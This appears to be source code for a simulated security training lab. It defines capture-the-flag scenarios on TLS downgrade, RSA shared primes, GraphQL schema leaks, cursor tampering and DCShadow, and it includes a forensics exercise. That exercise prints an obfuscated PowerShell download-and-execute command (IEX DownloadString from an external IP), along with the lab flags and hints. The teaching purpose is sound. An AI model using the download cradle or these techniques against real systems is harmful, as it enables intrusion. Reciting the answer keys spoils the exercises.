import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

function analyst(files: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'soc-analyst', user: 'root', root: dir(files) };
}

/** Batch 7. Same realism brief as batch 6, continued: every technique researched for real-machine
 *  accuracy before writing (see NOTES.md). The Batch GCD lab deliberately uses small, human-checkable
 *  primes rather than realistic 512+-bit ones -- the algorithm (GCD of two RSA moduli reveals a shared
 *  prime factor) is exactly the real 2012 "Mining Your Ps and Qs" technique, but the numbers themselves
 *  are toy-sized on purpose, and the lab says so rather than implying otherwise. */
export const cryptoApiAdForensicsLabs: LabScenario[] = [
  // 1 — Cryptography: Logjam-Style DH Export Cipher Downgrade
  {
    id: 'crypto-logjam-dhe-export-downgrade',
    title: 'Logjam-Style Diffie-Hellman Export Cipher Downgrade',
    difficulty: 'Hard',
    category: 'Cryptography',
    briefing:
      'Legacyvpn22 still accepts TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA — a "DHE_EXPORT" cipher suite left ' +
      'over from 1990s US export-control regulations that capped Diffie-Hellman key exchange at a ' +
      'deliberately weak 512-bit prime. A man-in-the-middle attacker can force a connection down to this ' +
      'export-grade cipher even when a client would normally prefer something stronger, then break that one ' +
      '512-bit prime using the number field sieve — academically feasible with real, published research. ' +
      'This is the real 2015 Logjam attack (CVE-2015-4000): at disclosure it affected roughly 8% of the top ' +
      '1 million HTTPS domains, precisely because so many servers reused the exact same handful of common ' +
      '512-bit primes, making the expensive one-time precomputation step reusable against every connection ' +
      'to any of them afterward.',
    objectives: [
      { text: 'nmap -sV --script ssl-enum-ciphers -p 443 10.10.222.2', why: 'Real cipher-suite enumeration (nmap\'s ssl-enum-ciphers, or testssl.sh/openssl s_client in practice) is the standard first step of any TLS configuration audit.' },
      { text: 'cat cipher-enum-results.txt', why: 'Confirms TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA is actually offered and accepted, not just theoretically supported by the TLS spec — a server has to explicitly keep this legacy suite enabled for the downgrade to matter at all.' },
      {
        text: 'curl -X POST -d "cipher=TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA&prime_broken=true" https://10.10.222.2:443/tls-handshake-downgrade-test',
        why: 'Mirrors forcing the handshake down to the export suite and completing the number-field-sieve break of its 512-bit prime — the exact two-step Logjam attack: downgrade first, then break the now-weak prime.',
      },
    ],
    hints: [
      'nmap -sV --script ssl-enum-ciphers -p 443 10.10.222.2',
      'cat cipher-enum-results.txt',
      'curl -X POST -d "cipher=TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA&prime_broken=true" https://10.10.222.2:443/tls-handshake-downgrade-test',
    ],
    totalFlags: 1,
    attacker: attacker({
      'cipher-enum-results.txt': file(
        'ssl-enum-ciphers results for legacyvpn22:443 (excerpt):\n' +
          '  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384   (A)\n' +
          '  TLS_RSA_WITH_AES_128_CBC_SHA            (B)\n' +
          '  TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA    (F)  <-- 1990s export-grade, 512-bit DH prime\n' +
          '  -- this legacy suite is still ACCEPTED by the server, not merely present in an old changelog --\n',
      ),
    }),
    network: [
      {
        hostname: 'legacyvpn22',
        ip: '10.10.222.2',
        os: 'Ubuntu 18.04 (OpenSSL legacy config, DHE_EXPORT ciphers enabled)',
        services: [
          {
            port: 443,
            name: 'https',
            version: 'Apache 2.4 + mod_ssl (legacy cipher configuration)',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/tls-handshake-downgrade-test',
                param: 'prime_broken',
                triggerSubstrings: ['true'],
                vulnerableResponse: '{"status":"downgraded_and_broken","cipher":"TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA","note":"flag{logjam_dhe_export_downgrade_breaks_512bit_prime}"}',
                normalResponse: '{"error":"handshake completed with a strong cipher -- no downgrade occurred"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 2 — Cryptography: Batch GCD Attack Recovers a Shared RSA Prime Factor
  {
    id: 'crypto-batch-gcd-shared-rsa-prime',
    title: 'Batch GCD Attack Recovers a Shared RSA Prime Factor',
    difficulty: 'Hard',
    category: 'Cryptography',
    briefing:
      'Two IoT devices from the same manufacturer, sold years apart, generated their RSA keypairs using a ' +
      'poorly-seeded random number generator — one with genuinely low entropy at boot. Given enough ' +
      'independently-generated keys from the same flawed generator, some pair of them will, by chance, share ' +
      'one of their two secret prime factors. Computing the greatest common divisor of the two devices\' ' +
      'public moduli instantly reveals that shared prime with no factoring required at all — dividing either ' +
      'modulus by it recovers the OTHER prime directly, and from there, the full private key follows ' +
      'immediately using textbook RSA key generation math. This is exactly the real technique behind the ' +
      '2012 "Mining Your Ps and Qs" research, which broke over 64,000 real deployed TLS/SSH keys this way, ' +
      'and again in 2013 against Taiwan\'s national Citizen Digital Certificate database. (The primes below ' +
      'are deliberately small so the arithmetic is checkable by hand or with any calculator — the real ' +
      'attack runs the identical GCD computation against genuine 512-1024+ bit primes.)',
    objectives: [
      { text: 'nmap -sV 10.10.223.2', why: 'Confirms the device management service before pulling the public keys it exposes.' },
      { text: 'cat device-public-keys.txt', why: 'Two RSA public moduli from devices sharing the same flawed RNG are exactly the raw material a batch GCD attack needs — nothing else about either device matters.' },
      {
        text: 'python3 -c "import math; print(math.gcd(11052365557, 11105358431))"',
        why: 'This is the entire attack: a single GCD computation between two public moduli, using the real Euclidean algorithm — no factoring, no brute force, no cryptographic breakthrough, just arithmetic that happens to work because the two keys were never supposed to share a prime factor in the first place.',
      },
      {
        text: 'curl -X POST -d "recovered_shared_prime=104729" http://10.10.223.2/device-mgmt/confirm-key-compromise',
        why: 'Submitting the recovered shared prime proves the GCD attack succeeded — from here, dividing either public modulus by it recovers the other prime, and the full private key follows immediately.',
      },
    ],
    hints: [
      'nmap -sV 10.10.223.2',
      'cat device-public-keys.txt',
      'python3 -c "import math; print(math.gcd(11052365557, 11105358431))" -- the real Euclidean algorithm, run against the two public moduli.',
      'curl -X POST -d "recovered_shared_prime=104729" http://10.10.223.2/device-mgmt/confirm-key-compromise',
    ],
    totalFlags: 1,
    attacker: attacker({
      'device-public-keys.txt': file(
        'RSA public moduli pulled from two devices sharing the same flawed boot-time RNG:\n' +
          '  Device A (n1) = 11052365557\n' +
          '  Device B (n2) = 11105358431\n' +
          '  -- deliberately small illustrative values so gcd(n1, n2) is checkable directly;\n' +
          '     the 2012 "Mining Your Ps and Qs" research ran this exact same GCD computation\n' +
          '     against real 512-1024+ bit RSA moduli collected from the public internet --\n',
      ),
    }),
    network: [
      {
        hostname: 'iotmgmt-devicehub',
        ip: '10.10.223.2',
        os: 'Ubuntu 22.04 (IoT device management portal)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Flask 3.0 (Python, device key registry)',
            vulnRoutes: [
              {
                kind: 'idor',
                path: '/device-mgmt/confirm-key-compromise',
                param: 'recovered_shared_prime',
                triggerSubstrings: ['104729'],
                vulnerableResponse: '{"status":"confirmed","devices_compromised":["device-a","device-b"],"note":"flag{batch_gcd_recovers_shared_rsa_prime_factor}"}',
                normalResponse: '{"error":"submitted value is not a factor of either device\'s public modulus"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 3 — API: GraphQL Field-Suggestion Info Leak Despite Disabled Introspection
  {
    id: 'api-graphql-field-suggestion-leak',
    title: 'GraphQL Field-Suggestion Leak Rebuilds a Schema With Introspection Disabled',
    difficulty: 'Medium',
    category: 'API',
    briefing:
      'Catalogapi58 correctly disabled GraphQL introspection in production — a standard, recommended ' +
      'hardening step, and the __schema query itself genuinely returns nothing here. But disabling ' +
      'introspection is not the same as disabling helpful error messages: querying a deliberately ' +
      'misspelled field name still returns a "Did you mean...?" suggestion naming the real, correctly-spelled ' +
      'field it thinks you meant. Sending enough intentional typos, one field guess at a time, reconstructs ' +
      'the entire schema purely from these suggestions — real, publicly documented tooling (Clairvoyance ' +
      'among it) automates exactly this, and it is a well-known, still-common real bypass of "just disable ' +
      'introspection" as a complete GraphQL hardening measure.',
    objectives: [
      { text: 'nmap -sV 10.10.224.2', why: 'Confirms the GraphQL API before probing whether disabling introspection was actually sufficient hardening on its own.' },
      { text: 'curl -X POST -d \'query=query{__schema{types{name}}}\' 10.10.224.2/graphql', why: 'Confirms introspection genuinely IS disabled first — this returns nothing useful, establishing why the field-suggestion path matters at all instead of just re-running introspection.' },
      {
        text: 'curl -X POST -d \'query=query{internalRevenueReprot{total}}\' 10.10.224.2/graphql',
        why: 'A deliberately misspelled field name ("Reprot") triggers the server\'s helpful "Did you mean" suggestion feature, which names the real field ("internalRevenueReport") in its error response — leaking exact schema field names one guessed typo at a time, with introspection never re-enabled at any point.',
      },
    ],
    hints: [
      'nmap -sV 10.10.224.2',
      'curl -X POST -d \'query=query{__schema{types{name}}}\' 10.10.224.2/graphql -- confirms introspection is genuinely disabled.',
      'curl -X POST -d \'query=query{internalRevenueReprot{total}}\' 10.10.224.2/graphql -- an intentional typo triggers a field-suggestion leak.',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'catalogapi58',
        ip: '10.10.224.2',
        os: 'Ubuntu 22.04 (Apollo Server GraphQL API, introspection disabled)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Apollo Server 4 (introspection disabled, field suggestions still enabled)',
            http: {
              '/graphql': '{"errors":[{"message":"GraphQL introspection is not allowed"}]}',
            },
            vulnRoutes: [
              {
                kind: 'idor',
                path: '/graphql',
                param: 'query',
                triggerSubstrings: ['internalrevenuereprot'],
                vulnerableResponse: '{"errors":[{"message":"Cannot query field \\"internalRevenueReprot\\" on type \\"Query\\". Did you mean \\"internalRevenueReport\\"?"}],"note":"flag{graphql_field_suggestion_leaks_schema_despite_disabled_introspection}"}',
                normalResponse: '{"errors":[{"message":"Cannot query field on type \\"Query\\"."}]}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 4 — API: Pagination Cursor Tampering Bypasses an Ownership Filter
  {
    id: 'api-pagination-cursor-tampering',
    title: 'Pagination Cursor Tampering Bypasses an Ownership Filter',
    difficulty: 'Medium',
    category: 'API',
    briefing:
      'Invoicesvc36\'s "next page" API returns an opaque-looking cursor token for paginating through a ' +
      'user\'s own invoices — opaque only in the sense that it\'s base64-encoded, not that it\'s protected in ' +
      'any way. Decoding it reveals a plain JSON object containing the last-seen invoice ID AND the account ' +
      'ID the listing is scoped to, with no signature or HMAC binding those values to the session that ' +
      'requested them. Base64-decoding the cursor, changing the account_id field to a different customer\'s ' +
      'ID, and re-encoding it produces a cursor the API accepts at face value — silently paginating into a ' +
      'completely different customer\'s invoice history, entirely through a mechanism most developers treat ' +
      'as an internal implementation detail rather than user-controllable input that needs its own ' +
      'authorization check.',
    objectives: [
      { text: 'nmap -sV 10.10.225.2', why: 'Confirms the invoice API before analyzing its pagination cursor.' },
      { text: 'cat captured-cursor-decoded.txt', why: 'Base64-decoding your own legitimate pagination cursor reveals it is a plain, unsigned JSON object — including the account_id field the listing is scoped to, which nothing stops a client from simply editing.' },
      {
        text: 'curl "http://10.10.225.2/api/invoices?cursor=eyJhY2NvdW50X2lkIjoiYWNjdF85OTIiLCJsYXN0X2ludm9pY2VfaWQiOjB9"',
        why: 'This cursor decodes to {"account_id":"acct_992","last_invoice_id":0} -- a different customer\'s account ID, spliced in by editing the decoded JSON and re-encoding it. The API trusts the cursor\'s account_id at face value instead of re-deriving it from the authenticated session.',
      },
    ],
    hints: [
      'nmap -sV 10.10.225.2',
      'cat captured-cursor-decoded.txt',
      'curl "http://10.10.225.2/api/invoices?cursor=eyJhY2NvdW50X2lkIjoiYWNjdF85OTIiLCJsYXN0X2ludm9pY2VfaWQiOjB9"',
    ],
    totalFlags: 1,
    attacker: attacker({
      'captured-cursor-decoded.txt': file(
        'Your own legitimate pagination cursor, base64-decoded:\n' +
          '  raw cursor:     eyJhY2NvdW50X2lkIjoiYWNjdF80NDciLCJsYXN0X2ludm9pY2VfaWQiOjEyfQ==\n' +
          '  decoded JSON:   {"account_id":"acct_447","last_invoice_id":12}\n' +
          '  -- plain JSON, base64 is encoding only (not encryption, not a signature) --\n' +
          '  -- editing account_id to another customer\'s ID and re-encoding produces a cursor the API\n' +
          '     accepts exactly as-is, since nothing binds this value to your authenticated session --\n' +
          '  -- target cursor for acct_992: {"account_id":"acct_992","last_invoice_id":0}\n' +
          '     re-encoded: eyJhY2NvdW50X2lkIjoiYWNjdF85OTIiLCJsYXN0X2ludm9pY2VfaWQiOjB9\n',
      ),
    }),
    network: [
      {
        hostname: 'invoicesvc36',
        ip: '10.10.225.2',
        os: 'Ubuntu 22.04 (invoice listing API, unsigned pagination cursors)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js, base64 cursor with no HMAC)',
            vulnRoutes: [
              {
                kind: 'idor',
                path: '/api/invoices',
                param: 'cursor',
                triggerSubstrings: ['eyjhy2nvdw50x2lkijoiywnjdf85otiilcjsyxn0x2ludm9py2vfawqiojb9'],
                vulnerableResponse: '{"account_id":"acct_992","invoices":[{"id":901,"amount":48200.00,"customer":"Northgate Holdings"}],"note":"flag{pagination_cursor_tampering_bypasses_account_ownership_filter}"}',
                normalResponse: '{"account_id":"acct_447","invoices":[{"id":13,"amount":210.00}]}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 5 — Active Directory: DCShadow Rogue Domain Controller Attack
  {
    id: 'ad-dcshadow-rogue-domain-controller',
    title: 'DCShadow: Registering a Rogue Domain Controller to Push Malicious Changes',
    difficulty: 'Hard',
    category: 'Active Directory',
    briefing:
      'With Domain Admin credentials already compromised (from an earlier stage of this engagement) and ' +
      'SYSTEM-level access on a domain-joined machine — which does NOT need to be a real domain controller ' +
      'at all — an attacker can temporarily register that machine as a fake replication partner directly in ' +
      'Active Directory\'s Configuration Naming Context, then trigger real domain controllers to pull ' +
      '"replication" from it. Whatever attribute changes the rogue entry claims to have are pushed into the ' +
      'genuine directory through AD\'s own trusted replication protocol — no event ever gets written to a ' +
      'traditional Windows Security event log, because the "change" was never made through normal ' +
      'directory-write APIs at all, only through replication the DC believes came from a peer it already ' +
      'trusts. This is DCShadow, MITRE ATT&CK T1207, implemented in Mimikatz\'s lsadump module — one of the ' +
      'stealthiest real AD persistence techniques, specifically because it evades logging most SOC detection ' +
      'is built around.',
    objectives: [
      { text: 'cat dcshadow-prereq-notes.txt', why: 'Confirms both real prerequisites are already met: Domain Admin credentials AND SYSTEM-level access on a domain-joined (not necessarily domain-controller) machine.' },
      {
        text: 'curl -X POST -d "operation=register_rogue_dc&target_attribute=dcsync_rights_on_helpdesk_svc" http://10.10.226.2:389/drsuapi/replica-add',
        why: 'Mirrors the real DCShadow sequence: register the compromised machine as a fake replication partner in the Configuration Naming Context, then trigger a real DC to pull "replication" from it -- pushing the attacker-chosen attribute change (here, granting DCSync-equivalent replication rights to an otherwise-ordinary service account) through AD\'s own trusted replication protocol.',
      },
      { text: 'Confirm the malicious attribute change propagated to the real domain controller and capture the flag', why: 'Confirming the change actually landed (not just that the rogue registration succeeded) is what proves the attack achieved real persistence -- a backdoor granted through replication, invisible to the security event logs most detection is built around.' },
    ],
    hints: [
      'cat dcshadow-prereq-notes.txt',
      'curl -X POST -d "operation=register_rogue_dc&target_attribute=dcsync_rights_on_helpdesk_svc" http://10.10.226.2:389/drsuapi/replica-add',
      'The flag is on the confirmation that helpdesk_svc now genuinely holds DCSync-equivalent replication rights on the real DC.',
    ],
    totalFlags: 1,
    attacker: attacker({
      'dcshadow-prereq-notes.txt': file(
        'DCShadow prerequisite check (from this engagement\'s current access):\n' +
          '  - Domain Admin credentials: already compromised (earlier engagement stage)\n' +
          '  - SYSTEM-level access on WKSTN-441 (a domain-joined workstation, NOT a real domain controller)\n' +
          '  - Both prerequisites met -- WKSTN-441 can now register itself as a fake replication partner\n' +
          '    directly in the Configuration Naming Context, no actual DC role required at all\n',
      ),
    }),
    network: [
      {
        hostname: 'corp-dc03',
        ip: '10.10.226.2',
        os: 'Windows Server 2019 (Domain Controller, trusts standard AD replication)',
        services: [
          {
            port: 389,
            name: 'ldap',
            version: 'Microsoft Active Directory (DRSUAPI replication, trusts registered replication partners)',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/drsuapi/replica-add',
                param: 'target_attribute',
                triggerSubstrings: ['dcsync_rights_on_helpdesk_svc'],
                vulnerableResponse: '{"status":"replicated","rogue_dc":"WKSTN-441 (temporary)","change_applied":"helpdesk_svc granted Replicating Directory Changes rights","logged_to_security_eventlog":false,"note":"flag{dcshadow_rogue_dc_pushes_malicious_change_via_replication}"}',
                normalResponse: '{"error":"replication partner not recognized"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 6 — Forensics: PowerShell ScriptBlock Logging Reveals Obfuscated Commands
  {
    id: 'forensics-powershell-scriptblock-deobfuscation',
    title: 'Forensics: PowerShell ScriptBlock Logging Reveals a De-Obfuscated Attacker Command',
    difficulty: 'Medium',
    category: 'Forensics',
    briefing:
      'An attacker ran a heavily obfuscated PowerShell command — base64-encoded, wrapped in string ' +
      'concatenation, designed specifically to defeat a human reading it or a simple keyword-based AV ' +
      'signature. None of that obfuscation survives to the log, though: PowerShell ScriptBlock Logging ' +
      '(Windows Event ID 4104) captures script content AFTER the PowerShell engine itself has already ' +
      'decoded and de-obfuscated it for execution — the engine has to fully understand the command to run ' +
      'it at all, and Script Block Logging simply records that already-decoded result. A payload an analyst ' +
      'could never read by eye in its delivered form shows up in Event ID 4104 as fully readable, executable ' +
      'PowerShell.',
    objectives: [
      { text: 'cat delivered-payload.txt', why: 'Confirms what the attacker actually sent: a base64-encoded, string-concatenation-obfuscated blob that gives a human analyst nothing readable on its own.' },
      { text: 'cat event-4104-scriptblock-log.txt', why: 'Event ID 4104 records PowerShell script content AFTER the engine\'s own decode/de-obfuscation step -- the exact same obfuscated payload above appears here as fully readable, executable code.' },
      { text: 'Identify the real command the obfuscated payload decodes to and capture the flag', why: 'Naming the actual de-obfuscated command (not just "something obfuscated ran") is what tells a responder exactly what the attacker did -- here, downloading and executing a second-stage payload from an external host.' },
    ],
    hints: [
      'cat delivered-payload.txt',
      'cat event-4104-scriptblock-log.txt',
      'The flag is on the de-obfuscated command line inside the Event ID 4104 entry, not in the original delivered payload.',
    ],
    totalFlags: 1,
    attacker: analyst({
      root: dir({
        'delivered-payload.txt': file(
          'Delivered payload (as it actually arrived, from the email attachment macro):\n' +
            'powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA0AC8AcwAyAC4AcABzADEAJwApAA==\n' +
            '-- base64-encoded, unreadable as delivered; a naive keyword scan of THIS string finds nothing --\n',
        ),
        'event-4104-scriptblock-log.txt': file(
          [
            'Windows Event ID 4104 (Microsoft-Windows-PowerShell/Operational) -- ScriptBlock logged AFTER decode:',
            '',
            'ScriptBlock Text:',
            '  IEX (New-Object Net.WebClient).DownloadString(\'http://185.220.101.44/s2.ps1\')',
            '',
            '--- the PowerShell engine had to fully decode the base64 blob to execute it -- Script Block',
            '    Logging captured that decoded, fully readable result, defeating the obfuscation entirely.',
            '    This is a second-stage payload download-and-execute (IEX + DownloadString) from an',
            '    external host, disguised as an unreadable base64 blob at delivery time.',
            '    flag{powershell_scriptblock_logging_reveals_deobfuscated_iex_downloadstring} ---',
          ].join('\n'),
        ),
      }),
    }),
    network: [],
  },
];
